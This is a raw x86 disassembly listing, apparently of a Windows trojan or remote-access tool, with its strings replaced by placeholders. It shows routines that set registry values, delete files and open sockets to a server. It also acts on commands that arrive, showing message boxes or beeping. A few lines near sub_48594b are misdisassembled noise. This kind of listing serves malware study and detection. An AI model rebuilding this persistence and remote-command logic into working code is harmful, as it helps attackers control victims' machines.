push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf003f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov esi 0x80000002
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov esi 0x80000001
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
mov edx esi
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_4218e4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_422008
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4850f4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
sub_485150
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48520a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4851de
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x80000001
call RegOpenKeyA
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
inc ebx
push ebx
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x1
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
push eax
call RegSetValueExA
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485211
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_485248
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_485356
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48532a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf013f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax ebx
call sub_422068
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x1
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405974
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405818
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4058e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48535d
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax ebx
call sub_422008
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4853d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_48549b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf013f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax ebx
call sub_422068
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
xor eax eax
call sub_40f234
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0xc ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax ebx
call sub_422008
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4854a2
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
sub_48550c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_485755
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405584
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_489d40
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40a5d4
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x8 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x14 ]
call sub_489d40
mov edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x18 ]
call sub_489c78
mov edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x1a
call sub_48adcc
mov edx [ ebp - 0x1c ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x1f
call sub_48adcc
mov edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x16
call sub_48adcc
mov edx [ ebp - 0x24 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x17
call sub_48adcc
mov edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x5
call sub_48adcc
mov edx [ ebp - 0x2c ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x21
call sub_48adcc
mov edx [ ebp - 0x30 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x34 ]
xor eax eax
call sub_48adcc
mov edx [ ebp - 0x34 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48575c
lea eax [ ebp - 0x38 ]
mov edx 0xe
call sub_405554
retn
lea eax [ ebp - 0x38 ]
call sub_489bb0
mov edx [ ebp - 0x38 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_405864
jmp r-xdata
sub_485888
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
push ebp
push sub_485939
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x14
push 0x40
call LocalAlloc
mov esi eax
mov ebx esi
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_405584
lea eax [ ebx + 0x4 ]
call sub_405530
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_405584
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
call sub_405584
lea eax [ ebx + 0x10 ]
mov edx r-xdata
call sub_405584
mov eax [ rw-data ]
push eax
push 0x0
push esi
push sub_48317c
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485940
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_48594b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_485cbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov [ eax + 0x48 ] 0x1
xor edx edx
push ebp
push sub_485c82
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x44 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x44 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x18 ]
call sub_489bb0
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x18 ]
xor eax eax
call sub_48ab58
lea eax [ ebp - 0x1c ]
call sub_489bb0
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_48ab58
push r-xdata
lea eax [ ebp - 0x20 ]
call sub_489bb0
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
call sub_489bb0
lea eax [ ebp - 0x24 ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x24 ]
mov eax r-xdata
pop ecx
call sub_48a8ac
lea eax [ ebp - 0x28 ]
call sub_489bb0
lea eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x4 ]
call sub_48aab0
lea eax [ ebp - 0x2c ]
call sub_489bb0
lea eax [ ebp - 0x2c ]
mov edx r-xdata
call sub_405818
mov ebx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x30 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
lea eax [ ebp - 0x34 ]
call sub_489bb0
lea eax [ ebp - 0x34 ]
mov edx r-xdata
call sub_405818
mov ebx [ ebp - 0x34 ]
mov [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x30 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x38 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_485888
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x44 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4c ]
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ ebp - 0x14 ]
add eax 0x4c
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4c ]
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ ebp - 0x14 ]
add eax 0x4c
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4c ]
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ ebp - 0x14 ]
add eax 0x4c
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x4c ]
call sub_4055c8
mov eax [ ebp - 0xc ]
call sub_409edc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
call sub_409edc
push eax
call MessageBoxA
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485c89
mov eax [ ebp - 0x14 ]
mov [ eax + 0x48 ] 0x0
retn
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4c ]
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x4c ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ ebp - 0x14 ]
add eax 0x4c
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x4c ]
call sub_4055c8
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
mov eax [ ebp - 0x4 ]
call sub_409edc
push eax
call Beep
sub_485c89
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485cc5
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x2c ]
mov edx 0x6
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
sub_485d54
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_485d95
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485d9c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_485da8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_485de9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x4c ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485df0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_485eac
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edx edx
push ebp
push sub_485f28
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xec ] 0x0
je r-xdata
add eax 0x40
call sub_40f944
mov eax [ rw-data ]
call sub_466bdc
mov eax rw-data
call sub_40f944
mov eax rw-data
call sub_40f944
push 0x2
mov eax [ rw-data ]
push eax
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_466724
pop edi
pop esi
pop ebx
pop ebp
retn
sub_485f40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x18 ] edx
mov esi eax
xor eax eax
push ebp
push sub_486072
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
push 0x0
push 0x1
push 0x2
call socket
mov [ rw-data ] eax
cmp [ rw-data ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486079
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405554
retn
mov [ ebp - 0x10 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0xe ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov edi eax
mov [ ebp - 0xc ] edi
inc edi
jne r-xdata
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
call connect
push 0x0
push 0x1fff
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov eax rw-data
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x50 ]
call sub_409d70
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_475ecc
push 0x0
push 0x1fff
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov eax rw-data
xor ecx ecx
mov edx 0x2000
call sub_403af4
mov bl 0x1
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
sub_486092
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x2e ]
mov edi rw-data
xor eax eax
push ebp
push sub_4861fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_485eac
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x40 ] eax
mov eax ebx
call sub_485f40
test al al
je r-xdata
mov eax ebx
call sub_485eac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xe ] eax
movzx eax [ ebx + 0x48 ]
mov [ ebp - 0x10 ] ax
movzx eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] ax
movzx eax [ ebp - 0x10 ]
imul [ ebp - 0xe ]
add eax eax
mov [ ebp - 0xa ] eax
movzx eax [ ebp - 0x10 ]
add eax eax
mov [ ebp - 0x6 ] ax
cmp [ edi ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4664d0
mov [ edi ] eax
mov eax [ ebx + 0x40 ]
mov edx [ rw-data ]
mov [ edx + 0xa4 ] eax
mov [ edx + 0xa0 ] sub_486210
mov eax [ edi ]
movzx edx [ ebp - 0x10 ]
mov [ eax + 0x15e ] dx
mov eax [ edi ]
mov edx [ ebp - 0xe ]
mov [ eax + 0x160 ] edx
mov eax [ edi ]
mov edx [ ebp - 0xa ]
mov [ eax + 0x164 ] edx
mov eax [ edi ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x168 ] dx
mov eax [ edi ]
movzx edx [ ebp - 0x4 ]
mov [ eax + 0x16a ] dx
mov eax [ edi ]
mov edx [ eax + 0x164 ]
mov eax [ edi ]
call sub_466740
mov eax [ edi ]
mov edx [ eax + 0xf8 ]
mov eax [ rw-data ]
call sub_466c34
mov dl 0x1
mov eax [ edi ]
call sub_466724
mov eax [ edi ]
lea edx [ eax + 0x15c ]
mov eax [ rw-data ]
call sub_466afc
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_466964
mov [ rw-data ] eax
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push esi
call PeekMessageA
test eax eax
jne r-xdata
push esi
call TranslateMessage
push esi
call DispatchMessageA
sub_486210
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
mov edx [ eax + 0xf0 ]
mov eax ecx
mov ecx [ ebp + 0x8 ]
call sub_4030fc
mov eax [ rw-data ]
call sub_466470
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41b798
mov eax [ rw-data ]
mov edx [ eax + 0xf4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b978
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_41b734
mov edx r-xdata
mov eax [ rw-data ]
call sub_475f68
lea eax [ ebp - 0x4 ]
call sub_40f944
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
push ebx
push rw-data
mov eax [ rw-data ]
push eax
call send
push 0x0
push 0x1fff
push rw-data
mov eax [ rw-data ]
push eax
call recv
test ebx ebx
jne r-xdata
mov eax rw-data
xor ecx ecx
mov edx 0x2000
call sub_403af4
mov edx rw-data
mov ecx 0x2000
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
je r-xdata
sub_486374
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48642a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
lea ecx [ ebp - 0x10 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4613d8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
mov edi 0x1
mov [ ebp - 0x9 ] 0x1
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486431
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x0
push esi
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
lea eax [ eax + edi - 0x1 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
push eax
call send
mov ebx eax
test ebx ebx
jg r-xdata
sub esi ebx
add edi ebx
test esi esi
jg r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_486450
push ebx
push esi
mov esi eax
mov ebx edx
test ebx ebx
jle r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xd ] 0x0
jne r-xdata
push 0x3e8
call sub_407cb8
dec ebx
jne r-xdata
sub_486470
push ebx
mov ebx eax
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
je r-xdata
mov edx 0x14
mov eax ebx
call sub_486450
mov eax ebx
call sub_486374
test al al
je r-xdata
push 0x2
mov eax [ ebx + 0x40 ]
push eax
call shutdown
mov eax [ ebx + 0x40 ]
push eax
call closesocket
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_486528
sub_486528
push ebx
mov ebx eax
mov eax [ rw-data ]
mov [ eax ] 0x0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
call sub_48768c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_489948
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4884ac
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
mov eax [ rw-data ]
mov [ eax ] 0x0
push 0x2
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call shutdown
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call closesocket
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax ebx
call sub_4865e0
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41ff18
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_4865e0
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xffffffbc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2048 ] edx
mov [ ebp - 0x2040 ] edx
mov [ ebp - 0x2044 ] edx
mov [ ebp - 0x203c ] edx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4868d4
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea ecx [ ebp - 0x203c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_465178
mov eax [ ebp - 0x203c ]
call sub_4059dc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46509c
mov edx [ rw-data ]
mov [ edx ] ax
inc ebx
push 0xc8
call Sleep
jmp r-xdata
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x2038 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
lea eax [ ebp - 0x2038 ]
push eax
call TranslateMessage
lea eax [ ebp - 0x2038 ]
push eax
call DispatchMessageA
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x10
call sub_403af4
push 0x0
push 0x1
push 0x2
call socket
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp ebx eax
jle r-xdata
mov [ ebp - 0x1c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x1a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
push 0x10
lea eax [ ebp - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call connect
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call shutdown
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call closesocket
jmp r-xdata
mov eax esi
call sub_41ff18
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov esi eax
mov [ esi + 0xf ] 0x1
mov dl 0x5
mov eax esi
call sub_41fc40
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4864b4
mov edx edi
mov eax esi
call sub_4864b8
mov eax esi
call sub_41fef0
mov eax [ rw-data ]
mov [ eax ] 0x1
jmp r-xdata
mov eax esi
call sub_41ff18
cmp [ edi + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x201c ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x201c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call recv
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jmp r-xdata
lea eax [ ebp - 0x2044 ]
lea edx [ ebp - 0x201c ]
